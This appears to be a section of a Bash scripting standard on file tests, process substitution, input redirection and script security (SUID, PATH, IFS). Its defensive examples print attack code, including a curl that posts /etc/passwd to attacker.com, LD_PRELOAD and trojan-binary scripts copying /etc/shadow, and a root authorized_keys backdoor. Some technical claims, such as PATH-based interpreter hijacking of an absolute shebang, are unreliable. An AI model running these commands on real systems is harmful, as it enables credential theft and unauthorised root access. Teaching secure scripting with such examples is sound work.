- **Use `[[ ]]`** - more robust than `[ ]` or `test` command
- **Test before use** - prevents errors from missing/unreadable files
- **Fail fast** with `|| die` - exit immediately if prerequisites not met
- **Include filename** in error messages for debugging

**Common patterns:**

```bash
# Validate file exists and is readable
validate_file() {
  local file=$1
  [[ -f "$file" ]] || die 2 "File not found: $file"
  [[ -r "$file" ]] || die 5 "Cannot read file: $file"
}

# Ensure writable directory
ensure_writable_dir() {
  local dir=$1
  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory: $dir"
  [[ -w "$dir" ]] || die 5 "Directory not writable: $dir"
}

# Process only if modified
process_if_modified() {
  local source=$1 marker=$2
  if [[ ! -f "$marker" ]] || [[ "$source" -nt "$marker" ]]; then
    process_file "$source"
    touch "$marker"
  fi
}

# Check executable script
is_executable_script() {
  local file=$1
  [[ -f "$file" && -x "$file" && -s "$file" ]]
}

# Safe file sourcing
safe_source() {
  local file=$1
  if [[ -f "$file" ]]; then
    [[ -r "$file" ]] && source "$file" || { warn "Cannot read file: $file"; return 1; }
  fi
}
```

**Anti-patterns:**

```bash
#  Wrong - unquoted variable
[[ -f $file ]]  # Breaks with spaces/special chars

#  Correct
[[ -f "$file" ]]

#  Wrong - old [ ] syntax
if [ -f "$file" ]; then
  cat "$file"
fi

#  Correct
if [[ -f "$file" ]]; then
  cat "$file"
fi

#  Wrong - not checking before use
source "$config"  # Error if file doesn't exist

#  Correct - validate first
[[ -f "$config" ]] || die 3 "Config not found: $config"
[[ -r "$config" ]] || die 5 "Cannot read config: $config"
source "$config"

#  Wrong - silent failure
[[ -d "$dir" ]] || mkdir "$dir"  # mkdir failure not caught

#  Correct
[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: $dir"
```

**Combining tests:**

```bash
# Multiple conditions with AND
if [[ -f "$file" && -r "$file" && -s "$file" ]]; then
  process_file "$file"
fi

# Multiple conditions with OR (fallback config)
if [[ -f "$config1" ]]; then
  config_file=$config1
elif [[ -f "$config2" ]]; then
  config_file=$config2
else
  die 3 'No configuration file found'
fi

# Complex validation
validate_executable() {
  local script=$1
  [[ -e "$script" ]] || die 2 "File does not exist: $script"
  [[ -f "$script" ]] || die 22 "Not a regular file: $script"
  [[ -x "$script" ]] || die 126 "Not executable: $script"
  [[ -s "$script" ]] || die 22 "File is empty: $script"
}
```


---


**Rule: BCS1102**

## Wildcard Expansion

Always use explicit path when doing wildcard expansion to avoid issues with filenames starting with `-`.

```bash
#  Correct - explicit path prevents flag interpretation
rm -v ./*
for file in ./*.txt; do
  process "$file"
done

#  Incorrect - filenames starting with - become flags
rm -v *
```


---


**Rule: BCS1103**

## Process Substitution

**Use process substitution `<(command)` and `>(command)` to provide command output as file-like inputs or send data to commands as if writing to files. Eliminates temporary files, avoids subshell issues with pipes, enables powerful command composition.**

**Rationale:**

- **No Temporary Files**: Eliminates creating, managing, cleaning temp files
- **Avoid Subshells**: Unlike pipes to while, preserves variable scope
- **Multiple Inputs**: Read from multiple process substitutions simultaneously
- **Parallelism**: Multiple substitutions run concurrently
- **Resource Efficiency**: Data streams through FIFOs/file descriptors without disk I/O

**Mechanism**: Creates temporary FIFO/file descriptor connecting command output to input:

```bash
# >(command) - Output redirection to command's stdin
# <(command) - Input redirection from command's stdout

diff <(sort file1) <(sort file2)
# Expands to: diff /dev/fd/63 /dev/fd/64
```

**Basic patterns:**

```bash
# Input: compare outputs, multiple sources
diff <(ls dir1) <(ls dir2)
paste <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)

# Output: tee to multiple commands
command | tee >(wc -l) >(grep ERROR) > output.txt
```

**Common use cases:**

**1. Comparing command outputs:**

```bash
diff <(ls -1 /dir1 | sort) <(ls -1 /dir2 | sort)
diff <(sha256sum /backup/file) <(sha256sum /original/file)
diff <(ssh host1 cat /etc/config) <(ssh host2 cat /etc/config)
```

**2. Reading into arrays (avoids subshell):**

```bash
#  BEST
declare -a users
readarray -t users < <(getent passwd | cut -d: -f1)

# Null-delimited for filenames with spaces
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**3. Avoiding subshell in while loops:**

```bash
#  CORRECT - variables persist
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done < <(cat file.txt)

echo "Count: $count"  # Correct value!
```

**4. Parallel processing with tee:**

```bash
cat logfile.txt | tee \
  >(grep ERROR > errors.log) \
  >(grep WARN > warnings.log) \
  >(wc -l > line_count.txt) \
  > all_output.log
```

**Complete example - Configuration comparison:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

compare_configs() {
  local -a servers=("$@")
  local -- config_file='/etc/myapp/config.conf'

  [[ ${#servers[@]} -ge 2 ]] || { error 'Need at least 2 servers'; return 22; }

  local -- server1="${servers[0]}" server2="${servers[1]}"

  diff \
    <(ssh "$server1" "cat $config_file 2>/dev/null || echo 'NOT FOUND'") \
    <(ssh "$server2" "cat $config_file 2>/dev/null || echo 'NOT FOUND'")

  local -i diff_exit=$?
  ((diff_exit == 0)) && success "Configs identical" || warn "Configs differ"
  return "$diff_exit"
}

main() {
  compare_configs 'server1.example.com' 'server2.example.com'
}

main "$@"

#fin
```

**Complete example - Log analysis with parallel processing:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

analyze_log() {
  local -- log_file="$1" output_dir="${2:-.}"

  info "Analyzing $log_file..."

  # Process multiple ways simultaneously
  cat "$log_file" | tee \
    >(grep 'ERROR' | sort -u > "$output_dir/errors.txt") \
    >(grep 'WARN' | sort -u > "$output_dir/warnings.txt") \
    >(awk '{print $1}' | sort -u > "$output_dir/unique_timestamps.txt") \
    >(wc -l > "$output_dir/line_count.txt") \
    > "$output_dir/full_log.txt"

  wait

  local -i error_count warn_count total_lines
  error_count=$(wc -l < "$output_dir/errors.txt")
  warn_count=$(wc -l < "$output_dir/warnings.txt")
  total_lines=$(cat "$output_dir/line_count.txt")

  info "Total: $total_lines | Errors: $error_count | Warnings: $warn_count"
}

main() {
  analyze_log "${1:-/var/log/app.log}"
}

main "$@"

#fin
```

**Anti-patterns:**

```bash
#  Wrong - temp files instead
temp1=$(mktemp); temp2=$(mktemp)
sort file1 > "$temp1"; sort file2 > "$temp2"
diff "$temp1" "$temp2"
rm "$temp1" "$temp2"

#  Correct
diff <(sort file1) <(sort file2)

#  Wrong - pipe creates subshell
count=0
cat file | while read -r line; do ((count+=1)); done
echo "$count"  # Still 0!

#  Correct
count=0
while read -r line; do ((count+=1)); done < <(cat file)
echo "$count"  # Correct value

#  Wrong - sequential (reads file 3 times)
cat log | grep ERROR > errors.txt
cat log | grep WARN > warnings.txt
cat log | wc -l > count.txt

#  Correct - parallel (reads once)
cat log | tee >(grep ERROR > errors.txt) >(grep WARN > warnings.txt) >(wc -l > count.txt) > /dev/null

#  Wrong - unquoted variables
diff <(sort $file1) <(sort $file2)  # Word splitting!

#  Correct
diff <(sort "$file1") <(sort "$file2")
```

**Edge cases:**

**1. File descriptor assignment:**

```bash
exec 3< <(long_running_command)
while IFS= read -r line <&3; do echo "$line"; done
exec 3<&-
```

**2. NULL-delimited (filenames with spaces/newlines):**

```bash
while IFS= read -r -d '' file; do
  echo "Processing: $file"
done < <(find /data -type f -print0)
```

**3. Nested process substitution:**

```bash
diff <(sort <(grep pattern file1)) <(sort <(grep pattern file2))
```

**When NOT to use:**

```bash
# Simple command output - use command substitution
#  Overcomplicated
result=$(cat <(command))

#  Simpler
result=$(command)

# Variable expansion - use here-string
#  Overcomplicated
command < <(echo "$variable")

#  Simpler
command <<< "$variable"
```

**Summary:**

- **`<(command)`** - input from command as file
- **`>(command)`** - output to command as file
- **Eliminates temp files** - streams through FIFOs
- **Avoids subshells** - preserves variable scope
- **Parallel execution** - multiple substitutions run concurrently
- **Works with diff, comm, paste** - any command accepting files
- **Quote variables** inside substitutions like normal

**Key principle:** Process substitution makes command output look like a file. More efficient than temp files, safer than pipes (no subshell), enables powerful data processing. When creating temp files just to pass data, use process substitution instead.


---


**Rule: BCS1104**

## Here Documents
Use for multi-line strings or input.

```bash
# No variable expansion (note single quotes)
cat <<'EOF'
This is a multi-line
string with no variable
expansion.
EOF

# With variable expansion
cat <<EOF
User: $USER
Home: $HOME
EOF
```


---


**Rule: BCS1105**

## Input Redirection vs Cat: Performance Optimization

## Summary

Replace `cat filename` with `< filename` redirection in performance-critical contexts to eliminate process fork overhead. Provides 3-107x speedup depending on usage pattern.

## Performance Comparison

### Benchmark Results (1000 iterations)

| Test Scenario | `cat file` | `< file` | Speedup |
|---------------|------------|----------|---------|
| Small file to /dev/null | 0.792s | 0.234s | **3.4x** |
| Command substitution | 0.965s | 0.009s | **107x** |
| Large file (500 iter) | 0.398s | 0.115s | **3.5x** |

### Why the Difference?

**External `cat` overhead:** Fork process ’ exec binary ’ load into memory ’ setup environment ’ I/O ’ wait ’ cleanup (7 steps)

**Bash redirection `< file`:** Open FD ’ read/output ’ close FD (3 steps)

**Command substitution `$(< file)`:** Bash reads file directly with zero external processes (builtin-like behavior)

## When to Use `< filename`

### 1. Command Substitution (CRITICAL - 107x speedup)

```bash
# RECOMMENDED - Massively faster
content=$(< file.txt)
config=$(< /etc/app.conf)

# AVOID - 100x slower
content=$(cat file.txt)
config=$(cat /etc/app.conf)
```

**Rationale:** Bash reads file directly with zero external processes.

### 2. Single Input to Command (3-4x speedup)

```bash
# RECOMMENDED - Eliminates cat process
grep "pattern" < file.txt
while read line; do ...; done < file.txt
awk '{print $1}' < data.csv
jq '.field' < data.json

# AVOID - Wastes cat process
cat file.txt | grep "pattern"
cat data.csv | awk '{print $1}'
cat data.json | jq '.field'
```

### 3. Loop Optimization (Cumulative gains)

```bash
# RECOMMENDED
for file in *.json; do
    data=$(< "$file")
    errors=$(grep -c ERROR < "$file")
done

# AVOID - Forks cat thousands of times
for file in *.json; do
    data=$(cat "$file")
    errors=$(cat "$file" | grep -c ERROR)
done
```

**Rationale:** 1000 iterations = 1000 avoided process creations. Fork overhead multiplies.

## When NOT to Use `< filename`

| Scenario | Why Not | Use Instead |
|----------|---------|-------------|
| Multiple files | `< file1 file2` invalid | `cat file1 file2` |
| Cat options | No `-n`, `-A`, `-b` support | `cat -n file` |
| Direct output | `< file` alone produces nothing | `cat file` |
| Concatenation | Cannot combine sources | `cat file1 file2 file3` |

### Anti-Pattern: Invalid Usage

```bash
# WRONG - Does nothing (redirection without command)
< /tmp/test.txt

# WRONG - Invalid syntax
< file1.txt file2.txt
# Error: permission denied on file2.txt

# RIGHT - Multiple files need cat
cat file1.txt file2.txt
```

## Technical Details

### Why `< filename` Alone Does Nothing

The `<` operator is a **redirection operator**, not a **command**. It opens file on stdin but needs a command to consume it.

```bash
# Opens FD, no consumer, closes FD
< /tmp/test.txt

# These work - have consumer
cat < /tmp/test.txt
< /tmp/test.txt cat
```

### The Exception: Command Substitution

```bash
# Only case where < filename works standalone
content=$(< file.txt)
```

In `$()` context, bash itself reads the file and captures it as substitution result.

## Performance Model

```
Fork overhead dominant:    Small files in loops    ’ 100x+ speedup
I/O with fork overhead:    Large files, single use ’ 3-4x speedup
Zero fork:                 Command substitution    ’ 100x+ speedup
```

**Why speedup consistent across file sizes:** Process creation overhead (fork/exec) dominates I/O time even for large files.

## Real-World Example

### Before (400 process forks for 100 files)

```bash
for logfile in /var/log/app/*.log; do
    content=$(cat "$logfile")
    errors=$(cat "$logfile" | grep -c ERROR)
    warnings=$(cat "$logfile" | grep WARNING)
    if [ "$errors" -gt 0 ]; then
        cat "$logfile" error.log > combined.log
    fi
done
```

### After (100 process forks - 300 eliminated)

```bash
for logfile in /var/log/app/*.log; do
    content=$(< "$logfile")              # 100x faster
    errors=$(grep -c ERROR < "$logfile")  # No cat needed
    warnings=$(grep WARNING < "$logfile") # No cat needed
    if [ "$errors" -gt 0 ]; then
        cat "$logfile" error.log > combined.log  # Multiple files - must use cat
    fi
done
```

**Result:** 10-100x faster depending on file sizes.

## Recommendation

**SHOULD:** Use `< filename` for:
- Command substitution: `var=$(< file)`
- Single file input: `cmd < file`
- Loops with many file reads

**MAY:** Use `cat` when:
- Concatenating multiple files
- Need cat-specific options
- Code clarity over performance

**MUST:** Use `cat` when:
- Multiple file arguments needed
- Using options like `-n`, `-b`, `-E`, `-s`

## Impact Assessment

**Performance Gain:**
- Tight loops with command substitution: 10-100x
- Single command pipelines: 3-4x
- Large scripts with many reads: 5-50x overall

**Compatibility:**
- Works in bash 3.0+, zsh, ksh
- May not optimize in old shells (sh, dash)

**Code Clarity:**
- `$(< file)` is standard bash idiom
- `cmd < file` clearer than `cat file | cmd`

## Testing

```bash
echo "Test content" > /tmp/test.txt

# Command substitution (expect ~1.0s vs ~0.01s)
time for i in {1..1000}; do content=$(cat /tmp/test.txt); done
time for i in {1..1000}; do content=$(< /tmp/test.txt); done

# Pipeline (expect ~0.4s vs ~0.1s)
seq 1 1000 > /tmp/numbers.txt
time for i in {1..500}; do cat /tmp/numbers.txt | wc -l > /dev/null; done
time for i in {1..500}; do wc -l < /tmp/numbers.txt > /dev/null; done
```

## See Also

- BCS rule on process efficiency
- BCS rule on avoiding useless use of cat (UUOC)
- ShellCheck SC2002 (useless cat)


---


**Rule: BCS1200**

# Security Considerations

This section establishes security-first practices for production bash scripts across five critical areas: mandates never using SUID/SGID permissions due to inherent security risks, requires locking down PATH or explicitly validating it to prevent command hijacking, explains IFS (Internal Field Separator) safety to avoid word-splitting vulnerabilities, strongly discourages `eval` usage due to injection risks (requiring explicit justification when unavoidable), and details input sanitization patterns for validating and cleaning user input early. These practices prevent privilege escalation, command injection, path traversal, and other common attack vectors.


---


**Rule: BCS1201**

## SUID/SGID

**Never use SUID (Set User ID) or SGID (Set Group ID) bits on Bash scripts. This is a critical security prohibition with no exceptions.**

```bash
#  NEVER do this - catastrophically dangerous
chmod u+s /usr/local/bin/myscript.sh  # SUID
chmod g+s /usr/local/bin/myscript.sh  # SGID

#  Correct - use sudo for elevated privileges
sudo /usr/local/bin/myscript.sh

#  Correct - configure sudoers for specific commands
# In /etc/sudoers:
# username ALL=(ALL) NOPASSWD: /usr/local/bin/myscript.sh
```

**Rationale:**

SUID/SGID bits change effective user/group ID to the file owner's during execution. For scripts, the kernel executes the interpreter with the script as argumentthe interpreter inherits SUID/SGID privileges, then processes the script performing expansions and executing commands. This multi-step process creates attack vectors absent in compiled programs:

- **IFS Exploitation**: Attacker sets `IFS` to control word splitting, executing commands with elevated privileges
- **PATH Manipulation**: Kernel uses caller's `PATH` to find interpreter (before script's PATH is set), enabling trojan attacks
- **Library Injection**: `LD_PRELOAD`/`LD_LIBRARY_PATH` inject malicious code before script execution
- **Shell Expansion**: Bash expansions (brace, tilde, parameter, command substitution, glob) can be exploited
- **Race Conditions**: TOCTOU vulnerabilities in file operations between check and use
- **No Compilation**: Source is readable/modifiable, increasing attack surface

**Critical anti-patterns:**

**1. PATH Attack (interpreter resolution):**

```bash
# SUID script: /usr/local/bin/backup.sh (owned by root)
#!/bin/bash
set -euo pipefail
PATH=/usr/bin:/bin  # Script sets secure PATH

tar -czf /backup/data.tar.gz /var/data
```

**Attack:**
```bash
# Attacker creates malicious bash
mkdir /tmp/evil
cat > /tmp/evil/bash << 'EOF'
#!/bin/bash
cp -r /root/.ssh /tmp/stolen_keys
exec /bin/bash "$@"
EOF
chmod +x /tmp/evil/bash

export PATH=/tmp/evil:$PATH
/usr/local/bin/backup.sh

# Kernel uses caller's PATH to find interpreter!
# Attacker's code runs as root BEFORE script's PATH is set
```

**2. Library Injection Attack:**

```bash
# SUID script: /usr/local/bin/report.sh
#!/bin/bash
set -euo pipefail
echo "System Report" > /root/report.txt
df -h >> /root/report.txt
```

**Attack:**
```bash
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init(void) {
    if (geteuid() == 0) {
        system("cp /etc/shadow /tmp/shadow_copy");
    }
}
EOF

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
LD_PRELOAD=/tmp/evil.so /usr/local/bin/report.sh
# Malicious library runs with root privileges before script
```

**3. Command Injection via Unquoted Variables:**

```bash
# Vulnerable SUID script: /usr/local/bin/cleaner.sh (SUID root)
#!/bin/bash
directory="$1"
find "$directory" -type f -mtime +30 -delete
```

**Attack:**
```bash
/usr/local/bin/cleaner.sh "/tmp -o -name 'shadow' -exec cat /etc/shadow > /tmp/shadow_copy \;"
# Injected find command exfiltrates /etc/shadow
```

**Safe alternatives:**

**1. Use sudo with configured permissions:**

```bash
# /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/myapp.sh
%admin ALL=(root) /usr/local/bin/backup.sh --backup-only
```

**2. Use capabilities (compiled programs only):**

```bash
# Grant only specific privileges needed
setcap cap_net_bind_service=+ep /usr/local/bin/myserver
```

**3. Use setuid wrapper (compiled C program):**

```bash
# Wrapper validates input, sanitizes environment, then executes script
int main(int argc, char *argv[]) {
    if (argc != 2) return 1;
    setenv("PATH", "/usr/bin:/bin", 1);
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("IFS");
    execl("/usr/local/bin/backup.sh", "backup.sh", argv[1], NULL);
    return 1;
}
```

**4. Use systemd service with elevated privileges:**

```bash
# /etc/systemd/system/myapp.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/local/bin/myapp.sh

# User triggers: systemctl start myapp.service
```

**Detection and prevention:**

```bash
# Find SUID/SGID shell scripts (should return nothing!)
find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \; | grep -i script

# In deployment, explicitly ensure no SUID:
install -m 755 myscript.sh /usr/local/bin/
# Never use -m 4755 or chmod u+s on shell scripts
```

**Why sudo is safer:**

Sudo provides: logging to `/var/log/auth.log`, 15-minute credential timeout, granular command/argument/user control, automatic environment sanitization, and audit trail. SUID scripts bypass all these protections.

```bash
# Configure in /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/backup.sh

# Logged: "username : TTY=pts/0 ; USER=root ; COMMAND=/usr/local/bin/backup.sh"
```

**Summary:**

Modern Linux (since ~2005) ignores SUID on scripts, but many Unix variants still honor them. Never rely on kernel protectionthe practice is fundamentally unsafe. If you think you need SUID on a shell script, redesign using sudo, PolicyKit, systemd services, or compiled wrapper. Convenience is never worth the security risk.

**Key principle:** Audit systems regularly: `find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \;`


---


**Rule: BCS1202**

## PATH Security

**Always secure the PATH variable to prevent command substitution attacks and trojan binary injection.**

**Rationale:**

- **Command Hijacking**: Attacker-controlled directories in PATH allow malicious binaries to replace system commands
- **Current Directory Risk**: `.` or empty elements (`::`/leading `/trailing `:`) in PATH execute commands from current directory
- **Privilege Escalation**: Scripts with elevated privileges can be tricked into executing attacker code
- **Search Order Priority**: Earlier PATH directories are searched first, enabling priority-based attacks
- **Environment Inheritance**: PATH from caller's environment may be malicious
- **Writable Directory Risk**: World-writable directories in PATH allow trojan injection

**Lock down PATH at script start:**

```bash
#!/bin/bash
set -euo pipefail

#  Correct - set secure PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH

# Rest of script uses locked-down PATH
command=$(which ls)  # Searches only trusted directories
```

**Alternative: Validate existing PATH:**

```bash
#!/bin/bash
set -euo pipefail

#  Correct - validate PATH contains no dangerous elements
[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory'
[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element'
[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element'
[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element'
[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp'
[[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory'
```

**Attack Example 1: Current Directory in PATH**

```bash
# Attacker creates malicious 'ls' in /tmp
cat > /tmp/ls << 'EOF'
#!/bin/bash
cp /etc/shadow /tmp/stolen_shadow
chmod 644 /tmp/stolen_shadow
/bin/ls "$@"
EOF
chmod +x /tmp/ls

# Attacker sets PATH with /tmp first
export PATH=/tmp:$PATH

# When victim runs script from /tmp:
cd /tmp
/usr/local/bin/backup.sh  # Executes /tmp/ls instead of /bin/ls
```

**Attack Example 2: Empty PATH Element**

```bash
# PATH with empty element (double colon)
PATH=/usr/local/bin::/usr/bin:/bin
# Empty element is interpreted as current directory

# Attacker creates malicious command in accessible directory
cat > ~/tar << 'EOF'
#!/bin/bash
curl -X POST -d @/etc/passwd https://attacker.com/collect
/bin/tar "$@"
EOF
chmod +x ~/tar

# Vulnerable script runs from ~
cd ~
tar -czf backup.tar.gz data/  # Searches current directory, executes ~/tar
```

**Attack Example 3: Writable Directory in PATH**

```bash
# PATH includes /opt/local/bin which is world-writable
PATH=/opt/local/bin:/usr/local/bin:/usr/bin:/bin

# Attacker creates trojan in writable PATH directory
cat > /opt/local/bin/ps << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAA... attacker@evil" >> /root/.ssh/authorized_keys
/bin/ps "$@"
EOF
chmod +x /opt/local/bin/ps

# When ANY script runs 'ps', attacker gains root access
```

**Secure PATH patterns:**

**Pattern 1: Complete lockdown (recommended):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

# Use commands with confidence
tar -czf /backup/data.tar.gz /var/data
```

**Pattern 2: Full command paths (maximum security):**

```bash
#!/bin/bash
set -euo pipefail

# Don't rely on PATH at all - use absolute paths
/bin/tar -czf /backup/data.tar.gz /var/data
/usr/bin/systemctl restart nginx
/bin/rm -rf /tmp/workdir
```

**Pattern 3: PATH validation with fallback:**

```bash
#!/bin/bash
set -euo pipefail

validate_path() {
  if [[ "$PATH" =~ \.  ]] || \
     [[ "$PATH" =~ ^:  ]] || \
     [[ "$PATH" =~ ::  ]] || \
     [[ "$PATH" =~ :$  ]] || \
     [[ "$PATH" =~ /tmp ]]; then
    export PATH='/usr/local/bin:/usr/bin:/bin'
    readonly PATH
    warn 'Suspicious PATH detected, reset to safe default'
  fi
}

validate_path
```

**Pattern 4: Command verification:**

```bash
#!/bin/bash
set -euo pipefail

verify_command() {
  local cmd=$1
  local expected_path=$2
  local actual_path

  actual_path=$(command -v "$cmd")

  if [[ "$actual_path" != "$expected_path" ]]; then
    die 1 "Security: $cmd is $actual_path, expected $expected_path"
  fi
}

# Verify before using critical commands
verify_command tar /bin/tar
verify_command rm /bin/rm

# Now safe to use
tar -czf backup.tar.gz data/
```

**Anti-patterns:**

```bash
#  Wrong - trusting inherited PATH
#!/bin/bash
set -euo pipefail
# No PATH setting - inherits from environment
ls /etc  # Could execute trojan ls from anywhere in caller's PATH

#  Wrong - PATH includes current directory
export PATH=.:$PATH

#  Wrong - PATH includes /tmp (world-writable)
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin

#  Wrong - PATH includes user home directories
export PATH=/home/user/bin:$PATH

#  Wrong - empty elements in PATH
export PATH=/usr/local/bin::/usr/bin:/bin  # :: is current directory
export PATH=:/usr/local/bin:/usr/bin:/bin  # Leading : is current directory
export PATH=/usr/local/bin:/usr/bin:/bin:  # Trailing : is current directory

#  Wrong - setting PATH late in script
#!/bin/bash
set -euo pipefail
whoami  # Uses inherited PATH (dangerous!)
hostname
export PATH='/usr/bin:/bin'  # Too late!

#  Correct - set PATH at top of script
#!/bin/bash
set -euo pipefail
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
# Now all commands use secure PATH
```

**Edge case: Scripts requiring custom paths:**

```bash
#!/bin/bash
set -euo pipefail

# Start with secure base PATH
readonly BASE_PATH='/usr/local/bin:/usr/bin:/bin'
readonly APP_PATH='/opt/myapp/bin'

# Combine with secure base first
export PATH="$BASE_PATH:$APP_PATH"
readonly PATH

# Validate application path exists and is not world-writable
[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist: $APP_PATH"
[[ -w "$APP_PATH" ]] && die 1 "Application path is writable: $APP_PATH"

# Use commands from combined PATH
myapp-command --option
```

**PATH security check function:**

```bash
check_path_security() {
  local -a issues=()

  [[ "$PATH" =~ \.  ]] && issues+=('contains current directory (.)')
  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element')
  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)')
  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element')
  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp')

  if ((${#issues[@]} > 0)); then
    error 'PATH security issues detected:'
    local issue
    for issue in "${issues[@]}"; do
      error "  - $issue"
    done
    return 1
  fi

  info 'PATH security check passed'
  return 0
}

check_path_security || die 1 'PATH security validation failed'
```

**Summary:**

- **Always set PATH** explicitly at the start of security-critical scripts
- **Use `readonly PATH`** to prevent later modification
- **Never include** `.` (current directory), empty elements, `/tmp`, or user directories
- **Validate PATH** if using inherited environment
- **Use absolute paths** for critical commands as defense in depth
- **Place PATH setting early** - immediately after `set -euo pipefail`
- **Check permissions** on directories in PATH (none should be world-writable)

**Key principle:** PATH is trusted implicitly by command execution. An attacker who controls your PATH controls which code runs. Always secure it first.


---


**Rule: BCS1203**

## IFS Manipulation Safety

**Never trust inherited IFS values. Always protect IFS changes to prevent field splitting attacks and unexpected behavior.**

**Rationale:**

- **Security Vulnerability**: Attackers manipulate IFS in calling environment to exploit scripts
- **Field Splitting Exploits**: Malicious IFS causes splitting at unexpected characters, breaking argument parsing and enabling command injection
- **Environment Inheritance**: IFS inherits from parent processes and may be attacker-controlled
- **Global Side Effects**: Unprotected IFS changes break subsequent operations throughout script
- **Subtle Bugs**: IFS changes cause hard-to-debug issues when improperly scoped

IFS (Internal Field Separator) controls word splitting during expansion. Default: `$' \t\n'` (space, tab, newline).

**Attack Example - Field Splitting Exploitation:**

```bash
# Vulnerable script
process_files() {
  local -- file_list="$1"
  local -a files
  read -ra files <<< "$file_list"  # IFS could be manipulated
  for file in "${files[@]}"; do
    rm -- "$file"
  done
}

# Attack: Set IFS to bypass filtering
export IFS=$'\n'
./script.sh "/etc/passwd
/root/.ssh/authorized_keys"
# Script processes these as if in the list
```

**Attack Example - Command Injection via IFS:**

```bash
# Vulnerable: Split user input on spaces
read -ra cmd_parts <<< "$user_input"
"${cmd_parts[@]}"

# Attack: Manipulate IFS before calling
export IFS='X'
./script.sh "lsX-laX/etc/shadow"
# Becomes: cmd_parts=("ls" "-la" "/etc/shadow")
# Bypasses space-based input validation
```

**Safe Pattern 1: One-Line IFS Assignment (Preferred)**

```bash
# âœ“ IFS change applies only to single command
IFS=',' read -ra fields <<< "$csv_data"
# IFS automatically reset after read

IFS=':' read -ra path_dirs <<< "$PATH"
# Most concise and safe for single operations
```

**Safe Pattern 2: Local IFS in Function**

```bash
# âœ“ Use local to scope IFS change
parse_csv() {
  local -- csv_data="$1"
  local -a fields
  local -- IFS  # Make IFS local to function

  IFS=','
  read -ra fields <<< "$csv_data"
  # IFS automatically restored when function returns

  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
```

**Safe Pattern 3: Subshell Isolation**

```bash
# âœ“ IFS change isolated to subshell
fields=( $(
  IFS=','
  read -ra temp <<< "$csv_data"
  printf '%s\n' "${temp[@]}"
) )
# IFS automatically reverts when subshell exits
```

**Safe Pattern 4: Save and Restore**

```bash
# âœ“ Explicit save/restore
saved_ifs="$IFS"
IFS=','
read -ra fields <<< "$csv_data"
IFS="$saved_ifs"
```

**Safe Pattern 5: Set IFS at Script Start**

```bash
#!/bin/bash
set -euo pipefail

# Defend against inherited malicious IFS
IFS=$' \t\n'  # Space, tab, newline (default)
readonly IFS  # Prevent modification
export IFS

# Rest of script operates with trusted IFS
```

**Edge Cases:**

```bash
# IFS with read -d (delimiter)
# IFS= prevents field splitting; -d '' sets null delimiter
while IFS= read -r -d '' file; do
  process "$file"
done < <(find . -type f -print0)

# Empty IFS disables field splitting
IFS=''
read -ra words <<< "one two three"
# Result: words=("one two three")  # NOT split

# IFS= read preserves exact input
IFS= read -r line < file.txt  # Preserves leading/trailing whitespace
```

**Anti-patterns:**

```bash
# âœ— Wrong - no save/restore
IFS=','
read -ra fields <<< "$csv_data"
# IFS now ',' for entire script

# âœ“ Correct
saved_ifs="$IFS"; IFS=','; read -ra fields <<< "$csv_data"; IFS="$saved_ifs"

# âœ— Wrong - trust inherited IFS
read -ra parts <<< "$user_input"

# âœ“ Correct - set explicitly
IFS=$' \t\n'; readonly IFS; read -ra parts <<< "$user_input"

# âœ— Wrong - not restored on error
saved_ifs="$IFS"
IFS=','
some_command || return 1  # IFS not restored!

# âœ“ Correct - use subshell
(IFS=','; some_command || return 1)

# âœ— Wrong - global IFS change
IFS=$'\n'
for line in $(cat file.txt); do process "$line"; done

# âœ“ Correct - isolate
while IFS= read -r line; do process "$line"; done < file.txt
```

**Complete Safe Example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Set IFS to known-safe value immediately
IFS=$' \t\n'
readonly IFS
export IFS

VERSION='1.0.0'
